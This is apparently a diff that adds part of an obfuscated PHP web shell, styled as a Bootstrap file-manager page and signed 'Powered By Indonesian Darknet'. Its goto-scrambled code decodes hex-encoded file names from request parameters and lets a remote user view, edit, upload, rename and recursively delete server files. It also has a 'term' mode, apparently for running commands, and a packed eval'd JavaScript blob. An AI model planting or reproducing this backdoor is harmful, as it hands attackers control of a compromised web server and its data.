+          <span>PHP Version: <?php  goto LSR; n9x: function J6q($UJW, $uq0 = true, $em5 = 0) { goto lul; tyr: Q04: goto HcX; Gdb: if (!($em5 < $td7)) { goto Te8; } goto rGD; FT3: pxB: goto IHJ; rGD: $vr1 .= dechex(ord($UJW[$em5])); goto pps; vM_: if (!($em5 < $td7 - 1)) { goto Fon; } goto N3d; ZEq: DYD: goto zi3; uSa: if ($uq0 == false) { goto pxB; } goto fLq; IHJ: G50: goto Gdb; HcX: $em5 += 2; goto gKD; FBR: goto G50; goto MBT; Nzq: $td7 = strlen($UJW); goto uSa; gKD: goto ASp; goto hrK; MBT: Te8: goto ZEq; pps: h_r: goto DrC; N3d: $vr1 .= chr(hexdec("{$UJW[$em5]}{$UJW[$em5 + 1]}")); goto tyr; M91: goto DYD; goto FT3; DrC: $em5++; goto FBR; fLq: ASp: goto vM_; hrK: Fon: goto M91; zi3: return $vr1; goto HKr; lul: $vr1 = ''; goto Nzq; HKr: } goto yp8; elW: goto jUk; goto rBE; tfS: echo j6q($_GET["n"]); goto OGT; HXv: function IV1($Iue) { goto CVg; cSj: goto SGL; goto NNO; CVg: global $C_A; goto fwp; TxI: rmdir($Iue); goto eVM; EEU: unlink($Iue); goto cSj; N8b: return; goto UOZ; iMj: array_map("deldir", glob($Iue . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); goto TxI; eVM: SGL: goto C9D; UOZ: m5L: goto FWW; NNO: z8X: goto iMj; fwp: if (!(trim(pathinfo($Iue, PATHINFO_BASENAME), '.') === '')) { goto m5L; } goto N8b; FWW: if (is_dir($Iue)) { goto z8X; } goto EEU; C9D: } goto n9x; wm9: if ($TID == "term") { goto DO9; } goto D6Q; yCS: if (!in_array($ET6[$em5], $EpP)) { goto cfI; } goto krw; LSR: echo phpversion(); goto j99; Twh: ?>
+    <div class="px-2 py-2">
+    <?php  goto WZW; loW: fLL: goto Tp8; kg5: $n4G = getcwd(); goto tLc; iJy: goto MUF; goto Qfq; n4k: if (!file_exists($RjB)) { goto m3T; } goto mRd; MsN: if (!file_exists($RjB)) { goto CCO; } goto bwg; Yrk: LtS: goto RgT; F2z: if ($TID == "cdir") { goto TE1; } goto wm9; lWH: if ($TID == 'view') { goto MQ3; } goto tA2; n0y: echo $_GET["t"] == "d" ? "folder" : "file"; goto B6a; yKz: ?>"><i class="fa fa-plus-circle"></i> Folder</a> |
+          <a href="<?php  goto LFV; nZ8: function sBK($plZ) { goto ZzD; wzf: Z5p: goto Qw0; toW: $Bp3 .= $zQH & 0x20 ? 'r' : '-'; goto iBB; w6Q: $Bp3 .= $zQH & 0x80 ? 'w' : '-'; goto PJw; xMI: lMP: goto wzf; ZzD: $zQH = fileperms($plZ); goto vmj; Qw0: $Bp3 .= $zQH & 0x100 ? 'r' : '-'; goto w6Q; vmj: switch ($zQH & 0xf000) { case 0xc000: $Bp3 = 's'; goto Z5p; case 0xa000: $Bp3 = 'l'; goto Z5p; case 0x8000: $Bp3 = '-'; goto Z5p; case 0x6000: $Bp3 = 'b'; goto Z5p; case 0x4000: $Bp3 = 'd'; goto Z5p; case 0x2000: $Bp3 = 'c'; goto Z5p; case 0x1000: $Bp3 = 'p'; goto Z5p; default: $Bp3 = 'u'; } goto xMI; sY9: $Bp3 .= $zQH & 0x2 ? 'w' : '-'; goto IKd; hTL: return $Bp3; goto qDG; IKd: $Bp3 .= $zQH & 0x1 ? $zQH & 0x200 ? 't' : 'x' : ($zQH & 0x200 ? 'T' : '-'); goto hTL; RlR: $Bp3 .= $zQH & 0x4 ? 'r' : '-'; goto sY9; PJw: $Bp3 .= $zQH & 0x40 ? $zQH & 0x800 ? 's' : 'x' : ($zQH & 0x800 ? 'S' : '-'); goto toW; ukv: $Bp3 .= $zQH & 0x8 ? $zQH & 0x400 ? 's' : 'x' : ($zQH & 0x400 ? 'S' : '-'); goto RlR; iBB: $Bp3 .= $zQH & 0x10 ? 'w' : '-'; goto ukv; qDG: } goto HXv; hcs: zxM: goto yCS; jfR: if ($TID == 'rename') { goto Va6; } goto lWH; sSb: isset($_POST["s"]) ? file_put_contents($n4G . '/' . J6q($_GET["n"]), $_POST["ctn"]) ? bnh("file contents changed successfully", 1, "&a=" . J6q("view", 0) . "&n={$_GET["n"]}") : bNh("file contents failed to change") : null; goto uzI; HsV: ?>
+    <pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php  goto YIp; OGT: ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+    <?php  goto Tce; gc5: ?>
+    </div>
+    <div class="border bg-dark my-2 py-2 table-responsive">
+      <div class="mx-2">
+        <span>Path:</span>
+        <?php  goto VOW; bdw: echo j6Q($_GET["n"]); goto kb6; sS1: oGi: goto QfJ; phq: echo htmlspecialchars(file_get_contents($n4G . '/' . J6Q($_GET["n"]))); goto ttM; mTw: AGT: goto Ih7; ovY: xYD: goto L75; sus: wEl: goto Yrk; sBp: header("Content-Transfer-Encoding: Binary"); goto VwO; QfJ: ?>
+    <?php  goto wtw; sYD: dLR: goto TY7; eBH: if (!isset($_FILES['f'])) { goto jac; } goto UP2; BJM: $b9P = array_diff(scandir($n4G), ['.', '..']); goto OQP; z1p: Wpp: goto bLW; fmG: Dju: goto lAc; rBE: m3T: goto UO3; I8t: ?>
+      </tbody>
+    </table>
+    <?php  goto loW; Tp8: ?>
+    </article>
+    <div class="bg-dark border text-center mt-2 py-2"><small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small></div>
+  </main>
+  <script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
 </body>
 </html>
